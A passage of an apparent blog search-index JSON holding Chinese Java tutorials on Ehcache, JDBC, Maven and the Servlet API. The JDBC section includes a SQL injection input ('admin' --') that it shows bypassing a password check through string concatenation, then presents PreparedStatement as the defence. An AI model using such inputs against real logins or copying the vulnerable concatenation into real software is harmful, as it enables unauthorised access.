memoryStoreEvictionPolicy:可选策略有：LRU（最近最少使用，默认策略）、FIFO（先进先出）、LFU（最少访问次数）。      FIFO，first in first out，这个是大家最熟的，先进先出。      LFU， Less Frequently Used，就是上面例子中使用的策略，直白一点就是讲一直以来最少被使用的。如上面所讲，缓存的元素有一个hit属性，hit值最小的将会被清出缓存。      LRU，Least Recently Used，最近最少使用的，缓存的元素有一个时间戳，当缓存容量满了，而又需要腾出地方来缓存新的元素的时候，那么现有缓存元素中时间戳离当前时间最远的元素将被清出缓存。   --&gt;&lt;/ehcache&gt;\n\n\n\nRedis数据库来做缓存！  K-V\n练习：29道练习题实战！","categories":["java"],"tags":["java","mybatis"]},{"title":"JDBC技术详解","url":"/2025/04/16/java/jdbc/jdbc/","content":"JDBC技术详解1. JDBC基本概念JDBC (Java Database Connectivity) 是Java语言与数据库交互的标准API，它允许Java程序连接到各种关系型数据库。下面是对JDBC核心内容的总结：\nJDBC是一套标准接口，提供了一种与数据库无关的访问方式，主要包括：\n\nJDBC API：Java程序员使用的接口和类\nJDBC驱动程序管理器：负责管理不同数据库的驱动程序\nJDBC驱动程序：特定数据库厂商提供的实现类\n\n2. JDBC核心组件// 核心接口和类java.sql.DriverManager  // 管理JDBC驱动程序java.sql.Connection     // 与数据库的连接java.sql.Statement      // 执行SQL语句java.sql.PreparedStatement  // 预编译SQL语句java.sql.CallableStatement  // 调用存储过程java.sql.ResultSet      // 查询结果集\n\n3. JDBC工作流程3.1 基本使用步骤// 1. 加载驱动Class.forName(&quot;com.mysql.jdbc.Driver&quot;);// 2. 建立连接Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/test&quot;, &quot;username&quot;, &quot;password&quot;);// 3. 创建Statement对象Statement stmt = conn.createStatement();// 或创建PreparedStatement对象PreparedStatement pstmt = conn.prepareStatement(&quot;SELECT * FROM users WHERE id = ?&quot;);// 4. 执行SQL语句ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM users&quot;);// 或使用PreparedStatementpstmt.setInt(1, 1001);ResultSet rs = pstmt.executeQuery();// 5. 处理结果集while(rs.next()) &#123;    String name = rs.getString(&quot;name&quot;);    int age = rs.getInt(&quot;age&quot;);    // 处理数据...&#125;// 6. 关闭资源rs.close();stmt.close();conn.close();\n\n3.2 使用JDBC连接池// 以Apache DBCP为例BasicDataSource dataSource = new BasicDataSource();dataSource.setDriverClassName(&quot;com.mysql.jdbc.Driver&quot;);dataSource.setUrl(&quot;jdbc:mysql://localhost:3306/test&quot;);dataSource.setUsername(&quot;username&quot;);dataSource.setPassword(&quot;password&quot;);dataSource.setInitialSize(5);dataSource.setMaxTotal(10);Connection conn = dataSource.getConnection();// 使用连接...conn.close(); // 归还到连接池\n\n4 使用事务管理Connection conn = null;try &#123;    conn = dataSource.getConnection();    conn.setAutoCommit(false); // 关闭自动提交，开启事务        // 执行SQL操作    PreparedStatement ps1 = conn.prepareStatement(&quot;UPDATE accounts SET balance = balance - ? WHERE id = ?&quot;);    ps1.setDouble(1, 1000);    ps1.setInt(2, 1);    ps1.executeUpdate();        PreparedStatement ps2 = conn.prepareStatement(&quot;UPDATE accounts SET balance = balance + ? WHERE id = ?&quot;);    ps2.setDouble(1, 1000);    ps2.setInt(2, 2);    ps2.executeUpdate();        conn.commit(); // 提交事务&#125; catch (SQLException e) &#123;    if (conn != null) &#123;        try &#123;            conn.rollback(); // 发生异常，回滚事务        &#125; catch (SQLException ex) &#123;            ex.printStackTrace();        &#125;    &#125;    e.printStackTrace();&#125; finally &#123;    if (conn != null) &#123;        try &#123;            conn.close();        &#125; catch (SQLException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n5. 使用PreparedStatement防止SQL注入SQL注入是一种常见的安全漏洞，使用PreparedStatement可以有效防止：\n// 不安全的方式String username = request.getParameter(&quot;username&quot;); // 假设用户输入: &quot;admin&#x27; --&quot;String sql = &quot;SELECT * FROM users WHERE username = &#x27;&quot; + username + &quot;&#x27; AND password = &#x27;anything&#x27;&quot;;// 结果SQL: SELECT * FROM users WHERE username = &#x27;admin&#x27; --&#x27; AND password = &#x27;anything&#x27;// -- 注释掉了密码检查部分// 安全的方式：使用PreparedStatementString username = request.getParameter(&quot;username&quot;);PreparedStatement pstmt = conn.prepareStatement(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);pstmt.setString(1, username);pstmt.setString(2, password);ResultSet rs = pstmt.executeQuery();\n\n6. 批处理操作批处理可以提高大量数据操作的效率：\nConnection conn = dataSource.getConnection();conn.setAutoCommit(false); // 批处理通常与事务一起使用PreparedStatement pstmt = conn.prepareStatement(&quot;INSERT INTO users(name, age) VALUES(?, ?)&quot;);// 添加批处理项for (int i = 0; i &lt; 1000; i++) &#123;    pstmt.setString(1, &quot;用户&quot; + i);    pstmt.setInt(2, 20 + i % 30);    pstmt.addBatch();        // 每500条执行一次    if (i % 500 == 0) &#123;        pstmt.executeBatch();        pstmt.clearBatch();    &#125;&#125;// 执行最后一批pstmt.executeBatch();conn.commit();\n\n7. 数据库元数据JDBC提供了获取数据库和结果集元数据的API：\n// 获取数据库元数据DatabaseMetaData dbMetaData = conn.getMetaData();// 获取数据库产品信息String dbProductName = dbMetaData.getDatabaseProductName();String dbVersion = dbMetaData.getDatabaseProductVersion();System.out.println(&quot;数据库: &quot; + dbProductName + &quot; &quot; + dbVersion);// 获取表信息ResultSet tables = dbMetaData.getTables(null, null, &quot;%&quot;, new String[]&#123;&quot;TABLE&quot;&#125;);while (tables.next()) &#123;    System.out.println(&quot;表名: &quot; + tables.getString(&quot;TABLE_NAME&quot;));&#125;// 获取指定表的列信息ResultSet columns = dbMetaData.getColumns(null, null, &quot;users&quot;, &quot;%&quot;);while (columns.next()) &#123;    String columnName = columns.getString(&quot;COLUMN_NAME&quot;);    String dataType = columns.getString(&quot;TYPE_NAME&quot;);    int size = columns.getInt(&quot;COLUMN_SIZE&quot;);    System.out.println(&quot;列名: &quot; + columnName + &quot;, 类型: &quot; + dataType + &quot;, 大小: &quot; + size);&#125;// 获取结果集元数据ResultSet rs = stmt.executeQuery(&quot;SELECT * FROM users&quot;);ResultSetMetaData rsMetaData = rs.getMetaData();int columnCount = rsMetaData.getColumnCount();for (int i = 1; i &lt;= columnCount; i++) &#123;    System.out.println(&quot;列名: &quot; + rsMetaData.getColumnName(i));    System.out.println(&quot;列类型: &quot; + rsMetaData.getColumnTypeName(i));    System.out.println(&quot;列是否可为空: &quot; + rsMetaData.isNullable(i));&#125;\n\n8. 使用try-with-resources自动关闭资源Java 7引入的try-with-resources语法可以自动关闭JDBC资源：\ntry (    Connection conn = dataSource.getConnection();    PreparedStatement pstmt = conn.prepareStatement(&quot;SELECT * FROM users WHERE id = ?&quot;);) &#123;    pstmt.setInt(1, 1);    try (ResultSet rs = pstmt.executeQuery()) &#123;        if (rs.next()) &#123;            System.out.println(&quot;用户名: &quot; + rs.getString(&quot;username&quot;));        &#125;    &#125;&#125; catch (SQLException e) &#123;    e.printStackTrace();&#125;// 所有资源自动关闭，无需显式close()","categories":["java"],"tags":["java","jdbc","数据库"]},{"title":"Maven配置详解","url":"/2025/03/31/java/maven/maven%E9%85%8D%E7%BD%AE/","content":"Maven配置详解1. settings.xml 配置Maven的配置文件主要是 settings.xml，通常有两个位置：\n\n全局配置：$&#123;maven.home&#125;/conf/settings.xml\n用户配置：$&#123;user.home&#125;/.m2/settings.xml\n\n1.1 基本配置项&lt;settings&gt;    &lt;!-- 本地仓库路径配置 --&gt;    &lt;localRepository&gt;D:/maven/repository&lt;/localRepository&gt;        &lt;!-- 镜像配置 --&gt;    &lt;mirrors&gt;        &lt;mirror&gt;            &lt;id&gt;aliyun&lt;/id&gt;            &lt;name&gt;阿里云公共仓库&lt;/name&gt;            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        &lt;/mirror&gt;    &lt;/mirrors&gt;        &lt;!-- 代理配置 --&gt;    &lt;proxies&gt;        &lt;proxy&gt;            &lt;id&gt;optional&lt;/id&gt;            &lt;active&gt;true&lt;/active&gt;            &lt;protocol&gt;http&lt;/protocol&gt;            &lt;host&gt;proxy.somewhere.com&lt;/host&gt;            &lt;port&gt;8080&lt;/port&gt;        &lt;/proxy&gt;    &lt;/proxies&gt;&lt;/settings&gt;\n\n2. pom.xml 配置2.1 基础配置&lt;project&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;        &lt;!-- 项目坐标 --&gt;    &lt;groupId&gt;com.example&lt;/groupId&gt;    &lt;artifactId&gt;demo&lt;/artifactId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;        &lt;!-- 项目依赖 --&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;junit&lt;/groupId&gt;            &lt;artifactId&gt;junit&lt;/artifactId&gt;            &lt;version&gt;4.12&lt;/version&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;&lt;/project&gt;\n\n2.2 属性配置&lt;properties&gt;    &lt;java.version&gt;1.8&lt;/java.version&gt;    &lt;spring.version&gt;5.3.9&lt;/spring.version&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;&lt;/properties&gt;\n\n3. 常用Maven命令\nmvn clean: 清理项目\nmvn compile: 编译项目\nmvn test: 运行测试\nmvn package: 打包项目\nmvn install: 安装到本地仓库\nmvn deploy: 部署到远程仓库\n\n4. 生命周期Maven的生命周期分为三个标准周期：\n\nclean: 清理项目\ndefault: 构建项目\nsite: 生成项目站点\n\n5. 仓库配置5.1 仓库类型\n本地仓库\n远程仓库\n中央仓库\n私服\n其他公共仓库\n\n\n\n5.2 私服配置示例&lt;repositories&gt;    &lt;repository&gt;        &lt;id&gt;nexus&lt;/id&gt;        &lt;name&gt;Nexus Repository&lt;/name&gt;        &lt;url&gt;http://nexus.example.com/repository/maven-public/&lt;/url&gt;    &lt;/repository&gt;&lt;/repositories&gt;\n\n6. 插件配置&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;            &lt;version&gt;3.8.1&lt;/version&gt;            &lt;configuration&gt;                &lt;source&gt;$&#123;java.version&#125;&lt;/source&gt;                &lt;target&gt;$&#123;java.version&#125;&lt;/target&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;\n","categories":["java"],"tags":["java","maven","构建工具"]},{"url":"/2025/05/03/java/io/io%E6%B5%81/","content":""},{"title":"HttpServletRequest详解","url":"/2025/04/05/java/servlet/HttpServletRequest/","content":"HttpServletRequest接口详解HttpServletRequest是Servlet API中的核心接口，用于封装来自客户端的HTTP请求信息。本文将详细介绍该接口的所有方法及其用法。\n请求参数相关方法\n\n\n方法\n描述\n\n\n\nString getParameter(String name)\n获取指定名称的请求参数\n\n\nMap&lt;String, String[]&gt; getParameterMap()\n获取所有参数的映射表\n\n\nEnumeration&lt;String&gt; getParameterNames()\n获取所有参数名\n\n\nString[] getParameterValues(String name)\n获取指定名称的所有参数值\n\n\n请求头相关方法\n\n\n方法\n描述\n\n\n\nString getHeader(String name)\n获取指定名称的请求头值\n\n\nEnumeration&lt;String&gt; getHeaders(String name)\n获取指定名称的所有请求头值\n\n\nEnumeration&lt;String&gt; getHeaderNames()\n获取所有请求头名称\n\n\nint getIntHeader(String name)\n获取指定名称的请求头值作为整型\n\n\nlong getDateHeader(String name)\n获取指定名称的请求头值作为日期类型\n\n\nCookie相关方法\n\n\n方法\n描述\n\n\n\nCookie[] getCookies()\n获取所有Cookie\n\n\n会话管理相关方法\n\n\n方法\n描述\n\n\n\nHttpSession getSession()\n获取当前会话，不存在则创建\n\n\nHttpSession getSession(boolean create)\n获取当前会话，根据参数决定是否创建\n\n\nString getRequestedSessionId()\n获取请求的会话ID\n\n\nboolean isRequestedSessionIdValid()\n检查会话ID是否有效\n\n\nboolean isRequestedSessionIdFromCookie()\n检查会话ID是否来自Cookie\n\n\nboolean isRequestedSessionIdFromURL()\n检查会话ID是否来自URL\n\n\nboolean isRequestedSessionIdFromUrl()\n(已废弃)使用isRequestedSessionIdFromURL()\n\n\n请求路径相关方法\n\n\n方法\n描述\n\n\n\nString getContextPath()\n获取应用上下文路径\n\n\nString getServletPath()\n获取Servlet路径\n\n\nString getPathInfo()\n获取额外的路径信息\n\n\nString getPathTranslated()\n获取转换后的路径\n\n\nString getQueryString()\n获取请求URL中的查询字符串\n\n\nString getRequestURI()\n获取请求URI\n\n\nStringBuffer getRequestURL()\n获取请求URL\n\n\nString getMethod()\n获取HTTP请求方法\n\n\n协议相关方法\n\n\n方法\n描述\n\n\n\nString getProtocol()\n获取请求协议名称和版本\n\n\nString getScheme()\n获取请求协议方案(http&#x2F;https)\n\n\nboolean isSecure()\n检查是否是安全连接(HTTPS)\n\n\n客户端信息相关方法\n\n\n方法\n描述\n\n\n\nString getServerName()\n获取服务器名称\n\n\nint getServerPort()\n获取服务器端口号\n\n\nString getRemoteAddr()\n获取客户端IP地址\n\n\nString getRemoteHost()\n获取客户端主机名\n\n\nint getRemotePort()\n获取客户端端口号\n\n\nString getLocalAddr()\n获取服务器IP地址\n\n\nString getLocalName()\n获取服务器主机名\n\n\nint getLocalPort()\n获取服务器端口号\n\n\n请求体相关方法\n\n\n方法\n描述\n\n\n\nBufferedReader getReader()\n获取字符输入流读取请求体\n\n\nServletInputStream getInputStream()\n获取二进制输入流读取请求体\n\n\nString getCharacterEncoding()\n获取请求体字符编码\n\n\nvoid setCharacterEncoding(String env)\n设置请求体字符编码\n\n\nint getContentLength()\n获取请求体长度\n\n\nlong getContentLengthLong()\n获取请求体长度(long类型)\n\n\nString getContentType()\n获取请求体内容类型\n\n\n请求属性相关方法\n\n\n方法\n描述\n\n\n\nObject getAttribute(String name)\n获取指定名称的请求属性\n\n\nEnumeration&lt;String&gt; getAttributeNames()\n获取所有请求属性名\n\n\nvoid setAttribute(String name, Object o)\n设置请求属性\n\n\nvoid removeAttribute(String name)\n移除请求属性\n\n\n请求分发相关方法\n\n\n方法\n描述\n\n\n\nRequestDispatcher getRequestDispatcher(String path)\n获取请求分发器\n\n\n安全认证相关方法\n\n\n方法\n描述\n\n\n\nString getAuthType()\n获取认证类型\n\n\nString getRemoteUser()\n获取已认证的用户名\n\n\nboolean isUserInRole(String role)\n检查用户是否在指定角色中\n\n\nPrincipal getUserPrincipal()\n获取用户Principal对象\n\n\n常用方法详解获取请求参数// 获取单个参数String username = request.getParameter(&quot;username&quot;);// 获取多值参数String[] hobbies = request.getParameterValues(&quot;hobby&quot;);// 获取所有参数名称Enumeration&lt;String&gt; paramNames = request.getParameterNames();while (paramNames.hasMoreElements()) &#123;    String name = paramNames.nextElement();    String value = request.getParameter(name);    System.out.println(name + &quot;: &quot; + value);&#125;// 获取参数MapMap&lt;String, String[]&gt; paramMap = request.getParameterMap();for (String name : paramMap.keySet()) &#123;    String[] values = paramMap.get(name);    // 处理参数值&#125;\n\n获取请求头// 获取单个请求头String userAgent = request.getHeader(&quot;User-Agent&quot;);// 获取所有请求头名称Enumeration&lt;String&gt; headerNames = request.getHeaderNames();while (headerNames.hasMoreElements()) &#123;    String name = headerNames.nextElement();    String value = request.getHeader(name);    System.out.println(name + &quot;: &quot; + value);&#125;// 获取特定类型的请求头int contentLength = request.getIntHeader(&quot;Content-Length&quot;);long lastModified = request.getDateHeader(&quot;If-Modified-Since&quot;);\n\n会话管理// 获取会话对象，如果不存在则创建HttpSession session = request.getSession();// 获取会话对象，如果不存在则返回nullHttpSession session = request.getSession(false);// 检查会话ID是否有效boolean isSessionValid = request.isRequestedSessionIdValid();// 获取会话IDString sessionId = request.getRequestedSessionId();\n\n获取请求路径信息// 获取请求URL和URIStringBuffer requestURL = request.getRequestURL(); // 例如：http://localhost:8080/app/pageString requestURI = request.getRequestURI();     // 例如：/app/page// 获取上下文路径String contextPath = request.getContextPath();   // 例如：/app// 获取Servlet路径String servletPath = request.getServletPath();   // 例如：/page// 获取查询字符串String queryString = request.getQueryString();   // 例如：id=123&amp;name=test\n\n获取客户端信息// 获取客户端IP地址String clientIP = request.getRemoteAddr();// 获取请求方法String method = request.getMethod();// 检查是否为安全连接boolean isSecure = request.isSecure();\n\n请求属性操作// 设置请求属性request.setAttribute(&quot;user&quot;, userObject);// 获取请求属性User user = (User) request.getAttribute(&quot;user&quot;);// 删除请求属性request.removeAttribute(&quot;user&quot;);\n\n读取请求体// 读取文本数据BufferedReader reader = request.getReader();StringBuilder requestBody = new StringBuilder();String line;while ((line = reader.readLine()) != null) &#123;    requestBody.append(line);&#125;String content = requestBody.toString();// 读取二进制数据ServletInputStream inputStream = request.getInputStream();// 处理输入流...\n\n注意事项\ngetInputStream()和getReader()是互斥的，不能在同一请求中同时调用\n在调用getReader()之前应先设置正确的字符编码setCharacterEncoding()\n请求属性(getAttribute&#x2F;setAttribute)与请求参数(getParameter)不同，前者是在服务器端设置的，后者是从客户端提交的\n对于文件上传等复杂表单，需要使用Apache Commons FileUpload等库来处理\n请求参数获取不到时返回null，而不是抛出异常\n处理敏感信息时，应注意对接收到的请求参数进行安全过滤，防止XSS等攻击\n\n","categories":["java"],"tags":["java","servlet","web"]},{"title":"HttpServletResponse详解","url":"/2025/04/03/java/servlet/HttpServletResponse/","content":"HttpServletResponse接口详解HttpServletResponse是Servlet API中的核心接口，用于向客户端发送HTTP响应。本文将详细介绍该接口的所有方法及其用法。\n响应状态相关方法\n\n\n方法\n描述\n\n\n\nvoid setStatus(int sc)\n设置HTTP响应状态码\n\n\nvoid sendError(int sc)\n发送错误状态码\n\n\nvoid sendError(int sc, String msg)\n发送带有错误信息的状态码\n\n\nvoid setStatus(int sc, String sm)\n(已废弃)设置状态码和状态消息\n\n\n响应头相关方法\n\n\n方法\n描述\n\n\n\nvoid addCookie(Cookie cookie)\n添加Cookie到响应\n\n\nboolean containsHeader(String name)\n检查是否设置了指定响应头\n\n\nvoid setHeader(String name, String value)\n设置响应头\n\n\nvoid addHeader(String name, String value)\n添加响应头\n\n\nvoid setIntHeader(String name, int value)\n设置整型响应头\n\n\nvoid addIntHeader(String name, int value)\n添加整型响应头\n\n\nvoid setDateHeader(String name, long date)\n设置日期类型响应头\n\n\nvoid addDateHeader(String name, long date)\n添加日期类型响应头\n\n\n响应体相关方法\n\n\n方法\n描述\n\n\n\nServletOutputStream getOutputStream()\n获取输出流(二进制数据)\n\n\nPrintWriter getWriter()\n获取字符输出流\n\n\n编码和内容类型\n\n\n方法\n描述\n\n\n\nvoid setCharacterEncoding(String charset)\n设置响应字符编码\n\n\nString getCharacterEncoding()\n获取响应字符编码\n\n\nvoid setContentType(String type)\n设置内容类型\n\n\nString getContentType()\n获取内容类型\n\n\nvoid setContentLength(int len)\n设置内容长度\n\n\nvoid setContentLengthLong(long len)\n设置内容长度(long类型)\n\n\n缓冲管理\n\n\n方法\n描述\n\n\n\nvoid flushBuffer()\n刷新缓冲区\n\n\nvoid resetBuffer()\n重置缓冲区但保留响应头\n\n\nvoid reset()\n完全重置(包括响应头)\n\n\nboolean isCommitted()\n检查响应是否已提交\n\n\nvoid setBufferSize(int size)\n设置缓冲区大小\n\n\nint getBufferSize()\n获取缓冲区大小\n\n\n重定向与URL编码\n\n\n方法\n描述\n\n\n\nvoid sendRedirect(String location)\n发送重定向响应\n\n\nString encodeURL(String url)\n编码URL以支持会话跟踪\n\n\nString encodeRedirectURL(String url)\n编码重定向URL\n\n\nString encodeUrl(String url)\n(已废弃)使用encodeURL()\n\n\nString encodeRedirectUrl(String url)\n(已废弃)使用encodeRedirectURL()\n\n\n区域设置\n\n\n方法\n描述\n\n\n\nvoid setLocale(Locale loc)\n设置响应区域\n\n\nLocale getLocale()\n获取响应区域\n\n\n常用方法详解设置响应状态码response.setStatus(HttpServletResponse.SC_OK); // 200 OKresponse.sendError(HttpServletResponse.SC_NOT_FOUND); // 404 Not Foundresponse.sendError(HttpServletResponse.SC_FORBIDDEN, &quot;Access Denied&quot;); // 403 Forbidden\n\n设置响应头// 设置内容类型response.setContentType(&quot;text/html;charset=UTF-8&quot;);// 设置响应头response.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;);// 设置多值响应头response.addHeader(&quot;Set-Cookie&quot;, &quot;name=value&quot;);response.addHeader(&quot;Set-Cookie&quot;, &quot;name2=value2&quot;);\n\n发送响应数据// 方式一：使用PrintWriterPrintWriter writer = response.getWriter();writer.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);writer.println(&quot;&lt;h1&gt;Hello World!&lt;/h1&gt;&quot;);writer.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);writer.close();// 方式二：使用ServletOutputStreamServletOutputStream outputStream = response.getOutputStream();outputStream.write(&quot;Hello World!&quot;.getBytes());outputStream.close();\n\n重定向response.sendRedirect(&quot;/newpage.jsp&quot;);\n\n设置CookieCookie cookie = new Cookie(&quot;username&quot;, &quot;john&quot;);cookie.setMaxAge(3600); // 设置Cookie过期时间为1小时response.addCookie(cookie);\n\n注意事项\n调用getOutputStream()和getWriter()是互斥的，不能在同一个响应中同时使用\n在调用getWriter()之前应先设置字符编码和内容类型\n一旦响应被提交（isCommitted()返回true），就无法修改状态码、头信息或重置缓冲区\n重定向方法sendRedirect()会自动发送状态码302和Location头\n\n","categories":["java"],"tags":["java","servlet","web"]},{"title":"ServletContext","url":"/2025/04/01/java/servlet/ServletContext/","content":"1. ServletContext简介ServletContext代表整个Web应用程序，每个Web应用程序只有一个ServletContext对象。它是在Web容器启动时创建，在Web容器关闭时销毁。ServletContext提供了一个跨整个应用程序的共享环境。\n2. 获取ServletContext的方法// 方法1：通过HttpServlet获取ServletContext context = this.getServletContext();// 方法2：通过ServletConfig获取ServletContext context = getServletConfig().getServletContext();// 方法3：通过HttpServletRequest获取ServletContext context = request.getServletContext();// 方法4：通过HttpSession获取ServletContext context = session.getServletContext();\n\n3. ServletContext主要功能3.1 应用程序范围内的初始化参数在web.xml中配置：\n&lt;context-param&gt;    &lt;param-name&gt;appName&lt;/param-name&gt;    &lt;param-value&gt;MyWebApp&lt;/param-value&gt;&lt;/context-param&gt;\n\n在Servlet中使用：\nString appName = servletContext.getInitParameter(&quot;appName&quot;);Enumeration&lt;String&gt; paramNames = servletContext.getInitParameterNames();\n\n3.2 属性管理// 设置属性servletContext.setAttribute(&quot;userCount&quot;, 100);// 获取属性Integer userCount = (Integer) servletContext.getAttribute(&quot;userCount&quot;);// 移除属性servletContext.removeAttribute(&quot;userCount&quot;);// 获取所有属性名Enumeration&lt;String&gt; attrNames = servletContext.getAttributeNames();\n\n3.3 资源访问// 获取资源文件的真实路径String path = servletContext.getRealPath(&quot;/WEB-INF/config.properties&quot;);// 获取资源文件的URLURL url = servletContext.getResource(&quot;/WEB-INF/config.properties&quot;);// 获取资源流InputStream is = servletContext.getResourceAsStream(&quot;/WEB-INF/config.properties&quot;);// 获取指定路径下的所有资源Set&lt;String&gt; paths = servletContext.getResourcePaths(&quot;/WEB-INF/&quot;);\n\n3.4 日志记录servletContext.log(&quot;用户登录成功&quot;);servletContext.log(&quot;数据库连接失败&quot;, new SQLException(&quot;Connection refused&quot;));\n\n3.5 请求转发ServletContext 提供了请求转发的功能，可以将请求转发到其他 Servlet、JSP 或者静态资源。\n// 获取 RequestDispatcherRequestDispatcher dispatcher = servletContext.getRequestDispatcher(&quot;/target&quot;);// 转发请求dispatcher.forward(request, response);// 包含其他资源的内容dispatcher.include(request, response);\n\n实际使用示例：\n@WebServlet(&quot;/source&quot;)public class SourceServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)             throws ServletException, IOException &#123;        // 设置请求属性        request.setAttribute(&quot;message&quot;, &quot;Hello from SourceServlet&quot;);                // 获取 RequestDispatcher        RequestDispatcher dispatcher = getServletContext()            .getRequestDispatcher(&quot;/target&quot;);                // 转发请求        dispatcher.forward(request, response);    &#125;&#125;@WebServlet(&quot;/target&quot;)public class TargetServlet extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)             throws ServletException, IOException &#123;        // 获取转发的属性        String message = (String) request.getAttribute(&quot;message&quot;);                response.setContentType(&quot;text/html;charset=UTF-8&quot;);        PrintWriter out = response.getWriter();        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);        out.println(&quot;&lt;h2&gt;Target Servlet&lt;/h2&gt;&quot;);        out.println(&quot;&lt;p&gt;转发消息: &quot; + message + &quot;&lt;/p&gt;&quot;);        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);    &#125;&#125;\n\n请求转发的特点：\n\nURL 不会改变，客户端感知不到转发的发生\n只能转发到同一个 Web 应用中的资源\n请求属性会被保留并传递给目标资源\n可以使用相对路径或绝对路径（以”&#x2F;“开头）\n\n注意事项：\n\nforward() 方法调用后，原始的响应内容会被清空\n在调用 forward() 之前不要提交响应\ninclude() 方法可以将目标资源的输出添加到当前响应中\n避免循环转发导致死循环\n\n4. 最佳实践建议\n属性管理：\n\n只存储应用程序级别的数据\n避免存储过大的对象\n及时清理不再使用的属性\n\n\n资源访问：\n\n使用相对路径访问资源\n注意资源流的关闭\n缓存频繁访问的资源路径\n\n\n日志使用：\n\n记录重要的应用程序事件\n包含足够的上下文信息\n适当使用异常堆栈信息\n\n\n性能考虑：\n\n避免频繁读写ServletContext属性\n合理使用初始化参数\n注意线程安全问题\n\n\n\n5. 注意事项\nServletContext是线程不安全的，在并发访问时需要注意同步问题\n避免在ServletContext中存储用户级别的数据\n初始化参数在应用启动后不可修改\n资源路径要使用Web应用程序根目录作为基准\n及时释放通过ServletContext获取的资源\n\n","categories":["java"],"tags":["java","servlet","web"]},{"title":"Servlet实现原理","url":"/2025/03/31/java/servlet/servlet/","content":"1. Servlet生命周期graph TB\n    A[服务器启动] --> B{是否配置load-on-startup?}\n    B -->|是| C[初始化Servlet]\n    B -->|否| D[等待首次请求]\n    D --> C\n    C --> E[执行init方法]\n    E --> F[等待请求]\n    F --> G[执行service方法]\n    G --> F\n    H[服务器关闭] --> I[执行destroy方法]\n\n2. 请求处理流程sequenceDiagram\n    participant Client as 客户端\n    participant Server as Web服务器\n    participant Container as Servlet容器\n    participant Servlet as Servlet实例\n\n    Client->>Server: HTTP请求\n    Server->>Container: 转发请求\n    Container->>Container: 创建Request对象\n    Container->>Container: 创建Response对象\n    Container->>Servlet: 调用service()\n    Servlet->>Servlet: 根据请求方法调用do*()\n    Servlet-->>Container: 返回处理结果\n    Container-->>Server: 处理响应\n    Server-->>Client: HTTP响应\n\n3. Servlet容器架构graph LR\n    A[Web容器] --> B[生命周期管理]\n    A --> C[请求处理]\n    A --> D[多线程管理]\n    A --> E[安全控制]\n    \n    B --> B1[初始化]\n    B --> B2[服务]\n    B --> B3[销毁]\n    \n    C --> C1[请求分发]\n    C --> C2[响应处理]\n\n4. 过滤器链执行流程graph LR\n    A[请求] --> B[Filter1]\n    B --> C[Filter2]\n    C --> D[Filter3]\n    D --> E[Servlet]\n    E --> F[Filter3]\n    F --> G[Filter2]\n    G --> H[Filter1]\n    H --> I[响应]\n\n5. 核心组件关系classDiagram\n    class ServletContext {\n        +getInitParameter()\n        +getAttribute()\n        +setAttribute()\n    }\n    class ServletConfig {\n        +getServletName()\n        +getInitParameter()\n    }\n    class HttpServlet {\n        +init()\n        +service()\n        +destroy()\n    }\n    class HttpServletRequest {\n        +getParameter()\n        +getSession()\n        +getAttribute()\n    }\n    class HttpServletResponse {\n        +setContentType()\n        +getWriter()\n        +sendRedirect()\n    }\n    \n    ServletConfig --> ServletContext\n    HttpServlet --> ServletConfig\n    HttpServlet --> HttpServletRequest\n    HttpServlet --> HttpServletResponse\n\n6. 请求分发过程stateDiagram-v2\n    [*] --> 接收请求\n    接收请求 --> URL映射\n    URL映射 --> 创建请求响应对象\n    创建请求响应对象 --> 调用Servlet\n    调用Servlet --> 处理请求\n    处理请求 --> 生成响应\n    生成响应 --> [*]\n\n7. 关键代码示例public class ExampleServlet extends HttpServlet &#123;    // 初始化方法    @Override    public void init(ServletConfig config) throws ServletException &#123;        super.init(config);        // 初始化代码    &#125;    // 处理GET请求    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response)             throws ServletException, IOException &#123;        response.setContentType(&quot;text/html;charset=UTF-8&quot;);        PrintWriter out = response.getWriter();        out.println(&quot;&lt;html&gt;&lt;body&gt;&quot;);        out.println(&quot;&lt;h1&gt;Servlet示例&lt;/h1&gt;&quot;);        out.println(&quot;&lt;/body&gt;&lt;/html&gt;&quot;);    &#125;    // 销毁方法    @Override    public void destroy() &#123;        // 清理资源    &#125;&#125;\n\n8. web.xml配置示例&lt;web-app&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;exampleServlet&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.example.ExampleServlet&lt;/servlet-class&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;        &lt;servlet-mapping&gt;        &lt;servlet-name&gt;exampleServlet&lt;/servlet-name&gt;        &lt;url-pattern&gt;/example/*&lt;/url-pattern&gt;    